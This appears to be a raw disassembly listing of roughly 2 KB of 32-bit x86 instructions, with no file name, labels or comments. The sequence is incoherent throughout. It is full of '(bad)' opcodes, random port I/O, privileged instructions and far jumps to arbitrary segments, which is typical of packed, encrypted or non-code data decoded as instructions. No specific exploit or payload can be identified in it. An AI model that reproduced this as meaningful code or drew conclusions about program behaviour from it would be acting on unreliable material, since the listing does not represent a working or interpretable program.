  41949a:	cmp    eax,0x3182e878
  41949f:	ret    0x24e0
  4194a2:	ja     0x419465
  4194a4:	sahf   
  4194a5:	and    eax,0x69366523
  4194aa:	adc    dl,BYTE PTR [ebx-0x14]
  4194ad:	sbb    BYTE PTR [esi-0x4fbfd3fa],cl
  4194b3:	in     eax,0xcb
  4194b5:	or     eax,0x291a2e49
  4194ba:	or     DWORD PTR ds:0x126d68c9,eax
  4194c0:	(bad)  
  4194c1:	mov    cl,dh
  4194c3:	add    al,0xc6
  4194c5:	shr    BYTE PTR [esi-0x2261713a],1
  4194cb:	iret   
  4194cc:	inc    esp
  4194cd:	pushf  
  4194ce:	lea    ebp,[edx]
  4194d0:	sbb    esp,eax
  4194d2:	pop    es
  4194d3:	stos   DWORD PTR es:[edi],eax
  4194d4:	stos   BYTE PTR es:[edi],al
  4194d5:	mov    ch,0xce
  4194d7:	call   ecx
  4194d9:	fidiv  DWORD PTR ds:0xf22763af
  4194df:	push   ds
  4194e0:	je     0x41947a
  4194e2:	mov    esp,0xda472f0b
  4194e7:	(bad)  
  4194e8:	jg     0x419496
  4194ea:	push   0x83025059
  4194ef:	mov    ebx,0xdd3863f3
  4194f4:	mov    bl,0x54
  4194f6:	lods   al,BYTE PTR ds:[esi]
  4194f7:	jecxz  0x4194e4
  4194f9:	pusha  
  4194fa:	add    al,0xa0
  4194fc:	clc    
  4194fd:	lock retf 0xc56d
  419501:	jnp    0x4194b1
  419503:	and    BYTE PTR [ecx],ch
  419505:	dec    eax
  419506:	into   
  419507:	and    dl,BYTE PTR [esi]
  419509:	dec    esp
  41950a:	das    
  41950b:	mov    esp,0x48763d2e
  419510:	(bad)  
  419511:	and    ah,BYTE PTR [edx+ecx*8-0x69967f41]
  419518:	(bad)  
  419519:	xchg   esi,eax
  41951a:	inc    esi
  41951b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41951c:	in     al,0x5e
  41951e:	out    0x18,al
  419520:	loope  0x419596
  419522:	xor    DWORD PTR [ecx-0x29e58300],eax
  419528:	ret    0x4469
  41952b:	loope  0x419510
  41952d:	stos   BYTE PTR es:[edi],al
  41952e:	pop    ds
  41952f:	fs xchg ecx,eax
  419531:	leave  
  419532:	push   ecx
  419533:	or     eax,0x5f9189
  419538:	and    al,bh
  41953a:	xchg   edi,eax
  41953b:	out    0x52,eax
  41953d:	lds    ebp,FWORD PTR [ebx+0x5f]
  419540:	xchg   DWORD PTR [edi+esi*4+0x7a],ebp
  419544:	fnop   
  419546:	xor    BYTE PTR [ebp+0x71a349d2],ch
  41954c:	in     eax,dx
  41954d:	pusha  
  41954e:	and    bl,bl
  419550:	nop
  419551:	fsubr  QWORD PTR [ecx-0x3e]
  419554:	sub    BYTE PTR [edi+esi*2-0x34a5510f],bh
  41955b:	inc    ecx
  41955c:	mov    eax,ds:0x2494b119
  419561:	pop    ss
  419562:	xchg   ecx,eax
  419563:	test   BYTE PTR [eax-0x7a4bcd4c],dh
  419569:	out    0x82,eax
  41956b:	dec    ebx
  41956c:	out    dx,al
  41956d:	lds    ebx,FWORD PTR [ebx+0x161c6b34]
  419573:	cmp    DWORD PTR [eax],edx
  419575:	std    
  419576:	lods   eax,DWORD PTR ds:[esi]
  419577:	inc    ebx
  419578:	sbb    esp,DWORD PTR [edi+0x7d]
  41957b:	or     cl,BYTE PTR ds:0x737e6038
  419581:	mov    DWORD PTR [esp+eax*4],edi
  419584:	fnstcw WORD PTR [edi+edi*4]
  419587:	and    ch,bh
  419589:	cmp    BYTE PTR [ebx-0x639596f],bl
  41958f:	cmp    al,0x39
  419591:	sar    DWORD PTR [esi+0x122f0d02],cl
  419597:	ss retf 
  419599:	outs   dx,DWORD PTR ds:[esi]
  41959a:	adc    al,ah
  41959c:	in     al,dx
  41959d:	repnz lds edx,FWORD PTR [eax+0x37]
  4195a1:	test   bh,0x39
  4195a4:	xchg   ecx,eax
  4195a5:	les    eax,FWORD PTR [eax+0x476d0826]
  4195ab:	xchg   ebx,eax
  4195ac:	test   al,0xb1
  4195ae:	int    0x26
  4195b0:	retf   
  4195b1:	pushf  
  4195b2:	sbb    ecx,DWORD PTR ds:0xb88d17ea
  4195b8:	fidivr WORD PTR [ebx]
  4195ba:	lods   al,BYTE PTR ds:[esi]
  4195bb:	les    eax,FWORD PTR [ecx+esi*8]
  4195be:	adc    eax,0x8b6a9512
  4195c3:	(bad)  
  4195c4:	dec    esp
  4195c5:	jecxz  0x41954c
  4195c7:	sar    DWORD PTR [ebx+0x1d],cl
  4195ca:	push   0x5753b037
  4195cf:	jle    0x419551
  4195d1:	mov    ecx,0x50ce4313
  4195d6:	out    dx,eax
  4195d7:	lds    edi,FWORD PTR [esi]
  4195d9:	xor    al,0x1a
  4195db:	mov    esi,0xb935facb
  4195e0:	fdiv   DWORD PTR [ecx-0x45e8fe5]
  4195e6:	xor    bl,BYTE PTR [ebp+0x6a]
  4195e9:	xor    BYTE PTR [ecx+ecx*4-0x71],bh
  4195ed:	sbb    al,0x6e
  4195ef:	dec    edi
  4195f0:	cmp    dh,BYTE PTR ds:0x834b1880
  4195f6:	daa    
  4195f7:	xor    esp,DWORD PTR [eax]
  4195f9:	out    dx,eax
  4195fa:	and    DWORD PTR [ecx+0x3ddaa172],edx
  419600:	int    0xf3
  419602:	xchg   edx,eax
  419603:	leave  
  419604:	repnz mov ebx,0x7c84a19e
  41960a:	mov    ds:0x759687fa,eax
  41960f:	(bad)  
  419610:	fild   QWORD PTR [eax]
  419612:	out    dx,eax
  419613:	mov    DWORD PTR [eax+0x3fb78019],0x4a1f8097
  41961d:	js     0x41968a
  41961f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419620:	ret    0x90c8
  419623:	pop    edx
  419624:	dec    ebx
  419625:	loope  0x4195ee
  419627:	fadd   DWORD PTR [esi]
  419629:	sub    DWORD PTR [ebp+0xe],eax
  41962c:	pop    edi
  41962d:	std    
  41962e:	call   0xd70573d7
  419633:	mov    WORD PTR [ebp-0x1c6b95b],ds
  419639:	(bad)  
  41963a:	pop    esi
  41963b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41963c:	pop    ebp
  41963d:	pusha  
  41963e:	mov    ds:0x27b1c2ae,eax
  419643:	mov    ch,0x7c
  419645:	inc    esi
  419646:	and    eax,ecx
  419648:	sbb    eax,0x9ef440f3
  41964d:	add    BYTE PTR ds:0x4f8ac70a,bl
  419653:	or     DWORD PTR [ebx],ebp
  419655:	jns    0x419621
  419657:	pop    esi
  419658:	outs   dx,BYTE PTR ds:[esi]
  419659:	or     esp,ecx
  41965b:	mov    bl,0x38
  41965d:	xor    esi,DWORD PTR [ebp+eiz*8+0x44]
  419661:	pop    ecx
  419662:	push   cs
  419663:	xor    eax,0x8301f59d
  419668:	sbb    edi,DWORD PTR [esi+0x7]
  41966b:	jne    0x419626
  41966d:	push   esp
  41966e:	int    0x6a
  419670:	dec    ecx
  419671:	mov    edi,0x59669f9e
  419676:	in     al,0xec
  419678:	sbb    dl,dh
  41967a:	int3   
  41967b:	push   ebp
  41967c:	test   BYTE PTR [ebp+0x6f],bl
  41967f:	js     0x4196e5
  419681:	popf   
  419682:	addr16 pop es
  419684:	inc    ebx
  419685:	ficom  WORD PTR [edx]
  419687:	push   0x1e7f9380
  41968c:	in     al,dx
  41968d:	fnstenv [edx+0x5e0cdc9d]
  419693:	or     BYTE PTR [ebp+ebp*8+0x35],0x8f
  419698:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419699:	loopne 0x4196d8
  41969b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41969c:	pop    ebx
  41969d:	pop    esp
  41969e:	or     BYTE PTR [ebp+0x78],0x55
  4196a2:	cmp    eax,0x7aad98dd
  4196a7:	nop
  4196a8:	push   ebx
  4196a9:	mov    eax,0xe68a9a04
  4196ae:	inc    ebp
  4196af:	jmp    0x2021b7fd
  4196b4:	sub    dl,BYTE PTR [esi-0x2654ee56]
  4196ba:	dec    esp
  4196bb:	adc    eax,0x20d71983
  4196c0:	push   ebp
  4196c1:	stos   DWORD PTR es:[edi],eax
  4196c2:	loope  0x41967f
  4196c4:	jp     0x419694
  4196c6:	cli    
  4196c7:	jb     0x4196c3
  4196c9:	mov    cl,0xa6
  4196cb:	cld    
  4196cc:	dec    edi
  4196cd:	pop    ss
  4196ce:	inc    ebx
  4196cf:	cmp    esi,DWORD PTR [ebp-0x49]
  4196d2:	iret   
  4196d3:	adc    BYTE PTR [ebx+0x5f2152a3],ah
  4196d9:	scas   eax,DWORD PTR es:[edi]
  4196da:	cmc    
  4196db:	inc    ebp
  4196dc:	ret    0xa8fc
  4196df:	ret    
  4196e0:	ins    DWORD PTR es:[edi],dx
  4196e1:	lock mov cl,0x4d
  4196e4:	cli    
  4196e5:	dec    esp
  4196e6:	out    0xbe,eax
  4196e8:	xor    ebx,DWORD PTR [ecx+ebp*4-0x4f44cb2c]
  4196ef:	and    DWORD PTR [eax-0x67aa9634],ebx
  4196f5:	adc    bl,BYTE PTR fs:[ecx+0x59c1cfea]
  4196fc:	add    BYTE PTR [esp+eiz*2],0xf3
  419700:	in     eax,dx
  419701:	frstor [esi]
  419703:	fdivr  st(3),st
  419705:	ret    0xffb4
  419708:	aad    0x92
  41970a:	cs jno 0x419695
  41970d:	sbb    edx,esi
  41970f:	cmp    DWORD PTR ds:0x7910255d,ecx
  419715:	shr    DWORD PTR [ecx-0x52],1
  419718:	xchg   ebp,eax
  419719:	aaa    
  41971a:	add    DWORD PTR [esi],edx
  41971c:	sbb    bh,BYTE PTR [ecx]
  41971e:	es mov ecx,0x857bb5a6
  419724:	cmp    BYTE PTR [eax+0x15],dh
  419727:	adc    ecx,ebp
  419729:	xchg   ecx,eax
  41972a:	shl    ecx,1
  41972c:	xchg   esp,eax
  41972d:	and    esp,edi
  41972f:	cmp    DWORD PTR [ebp+0xe4ce43c],edi
  419735:	pop    ss
  419736:	ret    0xf96b
  419739:	lahf   
  41973a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41973b:	popa   
  41973c:	sbb    eax,0xfc76c70
  419741:	les    esp,FWORD PTR [edi-0xec7581]
  419747:	jp     0x419795
  419749:	mov    eax,ds:0xeb633ed8
  41974e:	mov    esi,0x21025046
  419753:	xchg   esi,eax
  419754:	cmc    
  419755:	(bad)  
  419756:	xchg   edi,eax
  419757:	rol    BYTE PTR [edx+0x3a],1
  41975a:	or     ebx,DWORD PTR [edi+0xb]
  41975d:	mov    dl,0xdf
  41975f:	sub    al,0x7c
  419761:	jmp    0x4229:0xbac56605
  419768:	cmp    DWORD PTR [eax+0x745420c9],0x4f
  41976f:	stc    
  419770:	xchg   ebx,eax
  419771:	mov    ch,0x1d
  419773:	jp     0x41971d
  419775:	mov    ds,WORD PTR [edx+0x7e5be5a2]
  41977b:	mov    ds:0x13f1b9cd,eax
  419780:	push   0x87635c7c
  419785:	loop   0x419737
  419787:	leave  
  419788:	pop    eax
  419789:	test   BYTE PTR [eax],0x80
  41978c:	pop    edi
  41978d:	mov    ah,0xa6
  41978f:	inc    esi
  419790:	aam    0x6a
  419792:	stos   DWORD PTR es:[edi],eax
  419793:	out    0x3e,al
  419795:	mov    ebp,0xe7e6092b
  41979a:	mov    ecx,0xe6fea387
  41979f:	mov    bh,0xf4
  4197a1:	mov    dl,0x57
  4197a3:	stos   BYTE PTR es:[edi],al
  4197a4:	(bad)  
  4197a5:	out    dx,eax
  4197a6:	or     BYTE PTR [esi],dh
  4197a8:	cli    
  4197a9:	mov    ecx,0x79b0f8f3
  4197ae:	pushf  
  4197af:	dec    eax
  4197b0:	cs push es
  4197b2:	and    BYTE PTR [esi+0x6afeb9c4],ch
  4197b8:	ins    BYTE PTR es:[edi],dx
  4197b9:	lock je 0x419779
  4197bc:	add    BYTE PTR [ebx-0x2e],bh
  4197bf:	jo     0x4197b0
  4197c1:	fnstcw WORD PTR [edi-0x3c6719fa]
  4197c7:	dec    esi
  4197c8:	in     eax,dx
  4197c9:	and    al,0x4b
  4197cb:	push   ebx
  4197cc:	in     al,dx
  4197cd:	addr16 daa 
  4197cf:	out    dx,al
  4197d0:	adc    ecx,DWORD PTR [edx-0x26]
  4197d3:	aam    0x8a
  4197d5:	nop
  4197d6:	sbb    DWORD PTR [eax],0xffffff86
  4197d9:	stos   BYTE PTR es:[edi],al
  4197da:	test   al,0xfa
  4197dc:	dec    ebp
  4197dd:	mov    dh,0xc8
  4197df:	inc    ebp
  4197e0:	mov    esp,0x6100628c
  4197e5:	push   eax
  4197e6:	mov    dh,0x53
  4197e8:	test   al,0xa3
  4197ea:	push   eax
  4197eb:	mov    bh,0x78
  4197ed:	fcomp  DWORD PTR [ebx-0x11]
  4197f0:	lods   al,BYTE PTR ds:[esi]
  4197f1:	(bad)  
  4197f4:	or     al,0x12
  4197f6:	cmp    eax,0xbda24d11
  4197fb:	add    eax,0xa021a827
  419800:	adc    al,0xdb
  419802:	mov    ebp,0x221018a5
  419807:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419808:	sub    DWORD PTR [ebp-0x4c],ebp
  41980b:	xor    eax,0xce3955d6
  419810:	push   ebp
  419811:	dec    ecx
  419812:	sbb    DWORD PTR [ecx-0x33],esp
  419815:	scas   eax,DWORD PTR es:[edi]
  419816:	stc    
  419817:	pop    esp
  419818:	das    
  419819:	sti    
  41981a:	adc    eax,0x7ad3e792
  41981f:	clc    
  419820:	push   ds
  419821:	lods   eax,DWORD PTR ds:[esi]
  419822:	xor    eax,0x28d01f95
  419827:	xlat   BYTE PTR ds:[ebx]
  419828:	scas   al,BYTE PTR es:[edi]
  419829:	retf   
  41982a:	mov    DWORD PTR [ebx],edx
  41982c:	adc    eax,esi
  41982e:	or     ecx,DWORD PTR [ebp-0x20414454]
  419834:	test   eax,0x84b24a20
  419839:	cmp    al,0xed
  41983b:	xchg   edi,eax
  41983c:	jle    0x419894
  41983e:	fisubr WORD PTR [eax]
  419840:	bound  eax,QWORD PTR [edx-0x27ceecc]
  419846:	call   0x2efa:0x2c760a23
  41984d:	pusha  
  41984e:	es aad 0x31
  419851:	inc    edx
  419852:	imul   edx,esi,0x7366f967
  419858:	int    0x56
  41985a:	cmp    DWORD PTR [edi],ebp
  41985c:	std    
  41985d:	out    dx,al
  41985e:	ret    0xf56e
  419861:	loop   0x419828
  419863:	(bad)  
  419864:	jmp    FWORD PTR ds:0x11c57142
  41986a:	lods   eax,DWORD PTR ds:[esi]
  41986b:	dec    ecx
  41986c:	test   eax,0x2b0a257d
  419871:	(bad)  
  419872:	retf   0xa328
  419875:	int    0x6c
  419877:	arpl   WORD PTR [ecx-0x455e2992],si
  41987d:	push   ds
  41987e:	pusha  
  41987f:	enter  0x3575,0x26
  419883:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419884:	xor    ebx,DWORD PTR [eax-0x2f73789]
  41988a:	sub    DWORD PTR [ebp+edx*2+0x1cf6c705],0xffffffbd
  419892:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419893:	loop   0x419903
  419895:	xlat   BYTE PTR ds:[ebx]
  419896:	and    DWORD PTR [edx+0x78],edi
  419899:	aad    0x9c
  41989b:	dec    edx
  41989c:	shr    ebx,0xde
  41989f:	cli    
  4198a0:	jae    0x419831
  4198a2:	push   0x6c54eb09
  4198a7:	cs mov bh,0x33
  4198aa:	repnz mov al,0xb9
  4198ad:	bound  eax,QWORD PTR [edi+0x7b]
  4198b0:	sub    DWORD PTR [edi+0x53],esi
  4198b3:	fldcw  WORD PTR [eax+0x63]
  4198b6:	std    
  4198b7:	out    dx,eax
  4198b8:	push   ss
  4198b9:	fwait
  4198ba:	and    ah,dh
  4198bc:	dec    esp
  4198bd:	push   ebp
  4198be:	sahf   
  4198bf:	(bad)  
  4198c0:	mov    cl,0x9d
  4198c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4198c3:	adc    DWORD PTR ds:[eax-0x27],0xe8b025f2
  4198cb:	gs sar ch,cl
  4198ce:	jnp    0x419915
  4198d0:	(bad)  
  4198d1:	daa    
  4198d2:	mov    ds,WORD PTR [ebx]
  4198d4:	and    dh,BYTE PTR [edi-0x6]
  4198d7:	xlat   BYTE PTR ds:[ebx]
  4198d8:	xor    BYTE PTR [ecx-0x20],0x98
  4198dc:	cmovb  ecx,DWORD PTR [ebx]
  4198df:	mov    cl,0xaf
  4198e1:	cmp    ebp,edi
  4198e3:	push   ebx
  4198e4:	test   DWORD PTR [esi],esp
  4198e6:	(bad)  
  4198e8:	mov    ebp,0x753eb691
  4198ed:	daa    
  4198ee:	jecxz  0x41988c
  4198f0:	pop    esi
  4198f1:	shr    bh,cl
  4198f3:	add    edi,esp
  4198f5:	int3   
  4198f6:	and    eax,0x4316279b
  4198fb:	jl     0x4198ea
  4198fd:	call   0xf219:0x22484529
  419904:	sub    ecx,DWORD PTR [esi+0x79]
  419907:	pushw  ds
  419909:	jg     0x41994f
  41990b:	adc    edi,DWORD PTR [ebx]
  41990d:	xchg   BYTE PTR [edi],ah
  41990f:	xor    eax,0x840eeb09
  419914:	inc    ebp
  419915:	repz mov WORD PTR [ecx+0x6fd25e75],cs
  41991c:	xchg   ecx,eax
  41991d:	mov    dl,0xba
  41991f:	pop    ecx
  419920:	mov    bl,0xc4
  419922:	mov    edi,0x142a976a
  419927:	rcl    BYTE PTR [ebx+0x453a62d4],cl
  41992d:	pop    ecx
  41992e:	xor    ebx,DWORD PTR [ebx+0x5]
  419931:	push   ds
  419932:	or     bh,bl
  419934:	in     eax,dx
  419935:	pop    esi
  419936:	stc    
  419937:	lock nop
  419939:	cmp    eax,0x971cc731
  41993e:	xchg   ebx,eax
  41993f:	dec    ecx
  419940:	(bad)  
  419941:	int3   
  419942:	cmp    al,0xc4
  419944:	shl    DWORD PTR [ebx-0x35],cl
  419947:	cmp    eax,0x1a3a8b56
  41994c:	jmp    0x419950
  41994e:	push   ebx
  41994f:	int3   
  419950:	jns    0x4198e4
  419952:	popa   
  419953:	aas    
  419954:	jp     0x4198f9
  419956:	shl    BYTE PTR ds:0x3d513ad,1
  41995c:	jno    0x419900
  41995e:	mov    BYTE PTR [edi-0x60],ch
  419961:	mov    eax,ds:0x21b2ed9f
  419966:	xor    edi,DWORD PTR ds:0xbb9dc899
  41996c:	addps  xmm4,XMMWORD PTR [esi-0x3a]
  419970:	inc    ebp
  419971:	das    
  419972:	inc    esp
  419973:	sbb    al,0xc1
  419975:	stc    
  419976:	jp     0x4199f7
  419978:	bound  esp,QWORD PTR ds:0xedabe30c
  41997e:	bnd jno 0x4199b0
  419981:	je     0x419976
  419983:	sti    
  419984:	push   cs
  419985:	cld    
  419986:	xchg   edx,eax
  419987:	push   ecx
  419988:	pop    edi
  419989:	push   cs
  41998a:	sub    al,0x7f
  41998c:	xchg   edi,ebx
  41998e:	pop    edx
  41998f:	sahf   
  419990:	mov    ds:0x7e096409,al
  419995:	sti    
  419996:	xchg   DWORD PTR ds:0x588c76,esi
  41999c:	pop    ebp
  41999d:	or     ecx,DWORD PTR [edx]
  41999f:	icebp  
  4199a0:	imul   eax,DWORD PTR [ebp+0x2c],0x5c14ce11
  4199a7:	xchg   esp,eax
  4199a8:	and    eax,0xedfcdb50
  4199ad:	xor    DWORD PTR [ebp-0x2c],eax
  4199b0:	lods   eax,DWORD PTR ds:[esi]
  4199b1:	sbb    BYTE PTR [edx+0x320bd603],ah
  4199b7:	das    
  4199b8:	xor    al,0xd7
  4199ba:	jg     0x419a15
  4199bc:	cmp    al,BYTE PTR [ebx+0x7ba5cab7]
  4199c2:	mov    dh,0x49
  4199c4:	js     0x419a29
  4199c6:	mov    WORD PTR [edi],ss
  4199c8:	pop    ebp
  4199c9:	(bad)  
  4199cb:	mov    cl,0x16
  4199cd:	sbb    BYTE PTR [ebx],ch
  4199cf:	(bad)  
  4199d0:	cmp    DWORD PTR [edi+0x1e],esi
  4199d3:	mov    esi,0xd19a472b
  4199d8:	lahf   
  4199d9:	retf   0x6de7
  4199dc:	jb     0x4199df
  4199de:	call   0x5956:0x51641158
  4199e5:	rcr    ecx,0x1c
  4199e8:	outs   dx,BYTE PTR ds:[si]
  4199ea:	xchg   ebp,eax
  4199eb:	repz jne 0x4199bf
  4199ee:	and    edx,DWORD PTR [esi-0x42]
  4199f1:	call   0x6de4:0x51166056
  4199f8:	push   es
  4199f9:	or     DWORD PTR [ebx+0x2134a1af],esp
  4199ff:	jmp    0x419a68
  419a01:	xor    DWORD PTR [ecx+0x2d8b5353],esp
  419a07:	cmp    BYTE PTR [eax],bl
  419a09:	fs sub eax,0x28052d24
  419a0f:	fisttp WORD PTR [esi]
  419a11:	into   
  419a12:	adc    DWORD PTR [ecx+0x7c],esi
  419a15:	push   0xaa65db28
  419a1a:	(bad)  
  419a1b:	arpl   WORD PTR [eax],sp
  419a1d:	add    esi,DWORD PTR [edx]
  419a1f:	cmp    DWORD PTR [ecx+0x63],ebx
  419a22:	fidivr WORD PTR [edx-0x6362deef]
  419a28:	cmp    DWORD PTR [edx+0x457b3ae7],ebx
  419a2e:	add    ch,BYTE PTR [ebp-0x603f61f]
  419a34:	loope  0x4199bb
  419a36:	or     al,0xea
  419a38:	jns    0x419a53
  419a3a:	jns    0x419aa1
  419a3c:	jge    0x4199bf
  419a3e:	adc    BYTE PTR [ecx],al
  419a40:	ret    0xf0e9
  419a43:	scas   eax,DWORD PTR es:[edi]
  419a44:	adc    DWORD PTR [esi-0x8],edx
  419a47:	sbb    eax,0xc9a2e7ed
  419a4c:	inc    ebx
  419a4d:	or     DWORD PTR [eax-0x5a],edi
  419a50:	hlt    
  419a51:	popa   
  419a52:	jne    0x419a2b
  419a54:	lahf   
  419a55:	xchg   ebx,eax
  419a56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a57:	xor    dh,BYTE PTR [edi]
  419a59:	sbb    BYTE PTR [ebp-0x492b7e9d],ch
  419a5f:	in     eax,0x70
  419a61:	inc    ebp
  419a62:	mov    ebx,0x759b38f8
  419a67:	pop    esi
  419a68:	mov    eax,DWORD PTR [ebx-0x36]
  419a6b:	xor    esi,0xffffffec
  419a6e:	adc    BYTE PTR [esi+0x78bc78b2],bh
  419a74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a75:	test   DWORD PTR [ecx-0x47852743],ecx
  419a7b:	xlat   BYTE PTR ds:[ebx]
  419a7c:	stos   BYTE PTR es:[edi],al
  419a7d:	iret   
  419a7e:	xchg   esi,eax
  419a7f:	mov    al,0xb7
  419a81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419a82:	push   ebx
  419a83:	pop    es
  419a84:	mov    ?,WORD PTR [edi]
  419a86:	mul    DWORD PTR [esi]
  419a88:	sbb    cl,bh
  419a8a:	rol    ebp,cl
  419a8c:	jnp    0x419a31
  419a8e:	aad    0xb6
  419a90:	adc    BYTE PTR [edi],ah
  419a92:	pop    edi
  419a93:	lock mov ds:0x4c0e625a,eax
  419a99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419a9a:	test   al,0xb3
  419a9c:	stos   DWORD PTR es:[edi],eax
  419a9d:	adc    eax,0x3c893705
  419aa2:	lock loopne 0x419ab6
  419aa5:	ret    0xf206
  419aa8:	sub    edx,DWORD PTR ds:0xf2714ad1
  419aae:	shl    BYTE PTR [ebx+0x42],cl
  419ab1:	push   ebx
  419ab2:	cmp    DWORD PTR [edx-0x65af9c96],esp
  419ab8:	inc    edi
  419ab9:	jecxz  0x419ad9
  419abb:	fmul   QWORD PTR [ebx+0x688416fd]
  419ac1:	jmp    0x24ea075b
  419ac6:	sub    al,bh
  419ac8:	add    cl,BYTE PTR [ecx-0x2e]
  419acb:	icebp  
  419acc:	adc    eax,0x8816c9fd
  419ad1:	rcl    eax,1
  419ad3:	mov    ebp,edx
  419ad5:	push   ebp
  419ad6:	sti    
  419ad7:	mov    edi,0xe7fc9c27
  419adc:	cmp    eax,0xdce74f76
  419ae1:	inc    edx
  419ae2:	push   cs
  419ae3:	scas   al,BYTE PTR es:[edi]
  419ae4:	xor    BYTE PTR [ecx+0x36],al
  419ae7:	ins    BYTE PTR es:[edi],dx
  419ae8:	imul   edx,edi,0x4b7ef82b
  419aee:	push   ecx
  419aef:	jmp    0x419af5
  419af1:	nop
  419af2:	xor    al,BYTE PTR [esi+0x9]
  419af5:	scas   eax,DWORD PTR es:[edi]
  419af6:	xchg   edi,eax
  419af7:	les    edx,FWORD PTR cs:[ecx+0x3b1622e0]
  419afe:	pop    esp
  419aff:	aas    
  419b00:	int    0x6b
  419b02:	jge    0x419abf
  419b04:	pop    es
  419b05:	arpl   WORD PTR [ebp+0x14],cx
  419b08:	sbb    BYTE PTR [ebp-0x71],0x62
  419b0c:	fwait
  419b0d:	jnp    0x419b5f
  419b0f:	jle    0x419b67
  419b11:	mov    edx,0x9376cd37
  419b16:	out    dx,al
  419b17:	int3   
  419b18:	pop    ebx
  419b19:	mov    bl,0x46
  419b1b:	cdq    
  419b1c:	call   0x11060b3c
  419b21:	cmp    al,0x2
  419b23:	inc    ebp
  419b24:	or     ebp,DWORD PTR [ecx+0x16]
  419b27:	cld    
  419b28:	loop   0x419b27
  419b2a:	out    dx,al
  419b2b:	sub    eax,0x2a55551
  419b30:	mov    ebx,0xb921a79a
  419b35:	hlt    
  419b36:	es es cli 
  419b39:	bound  ebp,QWORD PTR [edx]
  419b3b:	mov    bh,0x13
  419b3d:	mov    al,ds:0xa25cd081
  419b42:	outs   dx,DWORD PTR ds:[esi]
  419b43:	test   BYTE PTR [esi],0x12
  419b46:	or     eax,DWORD PTR [ebx+ecx*4-0x38]
  419b4a:	jo     0x419af3
  419b4c:	iret   
  419b4d:	add    eax,0x5293f8bb
  419b52:	lods   eax,DWORD PTR ds:[esi]
  419b53:	sbb    esi,DWORD PTR [esi+ebp*8]
  419b56:	and    edi,DWORD PTR [esi]
  419b58:	jle    0x419b6b
  419b5a:	add    ah,BYTE PTR [esi-0x485c4495]
  419b60:	loop   0x419ae7
  419b62:	and    DWORD PTR [eiz*1+0x6b3d3855],ebp
  419b69:	loop   0x419b9b
  419b6b:	and    bl,0xa4
  419b6e:	into   
  419b6f:	ficom  DWORD PTR [edx]
  419b71:	jmp    0x419bcf
  419b73:	loope  0x419b05
  419b75:	add    al,0x83
  419b77:	pop    esp
  419b79:	outs   dx,DWORD PTR ds:[esi]
  419b7a:	(bad)  
  419b7b:	es sbb ecx,eax
  419b7e:	ss mov eax,0xd7cb18ee
  419b84:	push   ds
  419b85:	push   0xd74836b6
  419b8a:	daa    
  419b8b:	mov    DWORD PTR [edx],ebp
  419b8d:	mov    ah,0xec
  419b8f:	outs   dx,DWORD PTR ds:[esi]
  419b90:	add    BYTE PTR [ebp+0x26df076b],bh
  419b96:	mov    cl,BYTE PTR [ebp-0x44]
  419b99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b9a:	jbe    0x419b8b
  419b9c:	sbb    al,0xf9
  419b9e:	pop    ecx
  419b9f:	or     DWORD PTR [edi-0x52],esp
  419ba2:	test   al,0x2b
  419ba4:	mov    BYTE PTR [edx],dl
  419ba6:	jmp    0x1802:0x15852160
  419bad:	mov    ch,0x12
  419baf:	push   esp
  419bb0:	repz rol dl,0xb1
  419bb4:	sub    edx,DWORD PTR [ebx]
  419bb6:	ficomp DWORD PTR [esi-0x1d2d66b]
  419bbc:	cmp    eax,0xa2fdd66e
  419bc1:	push   edx
  419bc2:	add    al,0x88
  419bc4:	add    ebx,DWORD PTR [esi+0x6b26bb19]
  419bca:	mov    esp,0x8a3261c
  419bcf:	shr    ebx,cl
  419bd1:	pop    ecx
  419bd2:	inc    edx
  419bd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419bd4:	or     ch,BYTE PTR ds:0xbdbbf692
  419bda:	ins    DWORD PTR es:[edi],dx
  419bdb:	dec    ebx
  419bdc:	clc    
  419bdd:	push   edi
  419bde:	inc    edx
  419bdf:	sbb    esp,DWORD PTR [esi-0x218f3d20]
  419be5:	inc    esi
  419be6:	push   ecx
  419be7:	mov    dl,0xce
  419be9:	pop    ebx
  419bea:	fdivr  DWORD PTR [edx+0x302a46ac]
  419bf0:	push   esp
  419bf1:	idiv   BYTE PTR [edx+ecx*4+0x7d]
  419bf5:	ss ja  0x419b85
  419bf8:	aaa    
  419bf9:	or     esp,esi
  419bfb:	out    dx,al
  419bfc:	xor    dl,BYTE PTR ds:0x75789989
  419c02:	dec    eax
  419c03:	xchg   esi,eax
  419c04:	inc    eax
  419c05:	out    0x29,eax
  419c07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c08:	mov    esp,ecx
  419c0a:	in     al,0x27
  419c0c:	mov    ecx,0x9e9c2813
  419c11:	pusha  
  419c12:	stc    
  419c13:	sahf   
  419c14:	ret    
  419c15:	les    esi,FWORD PTR [edx+0x6a]
  419c18:	mov    WORD PTR [eax-0x6249c3a3],cs
  419c1e:	inc    eax
  419c1f:	mov    edi,0x7d334259
  419c24:	aam    0xd4
  419c26:	or     eax,0xb567bd30
  419c2b:	jecxz  0x419c32
  419c2d:	add    ebx,DWORD PTR [eax]
  419c2f:	(bad)  
  419c30:	jmp    0x419c50
  419c32:	out    0x83,eax
  419c34:	add    DWORD PTR [ebp-0x37],ebx
  419c37:	dec    esp
  419c38:	sub    eax,0xa6ea1606
  419c3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c3e:	out    0x5d,al
  419c40:	int    0xd
  419c42:	cmp    ecx,DWORD PTR [eax]
  419c44:	sub    ebx,DWORD PTR [ecx]
  419c46:	data16 sub BYTE PTR [ecx+0x2947eb74],0x66
